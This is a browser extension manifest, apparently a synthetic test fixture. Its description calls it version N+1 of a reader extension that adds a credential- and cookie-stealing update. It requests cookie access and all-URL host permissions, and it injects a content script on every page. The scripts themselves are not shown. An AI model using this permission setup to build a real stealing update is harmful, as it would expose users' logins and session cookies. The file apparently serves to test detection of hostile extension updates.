{
 "manifest_version": 3,
 "name": "Controlled Update Pair",
 "version": "1.1.0",
 "description": "SYNTHETIC test extension, version N+1: the same reader with a credential and cookie stealing update.",
 "permissions": [
  "storage",
  "cookies"
 ],
 "background": {
  "service_worker": "background.js",
  "scripts": [
   "background.js"
  ]
 },
 "content_scripts": [
  {
   "matches": [
    "<all_urls>"
   ],
   "js": [
    "content.js"
   ],
   "run_at": "document_idle"
  }
 ],
 "host_permissions": [
  "<all_urls>"
 ]
}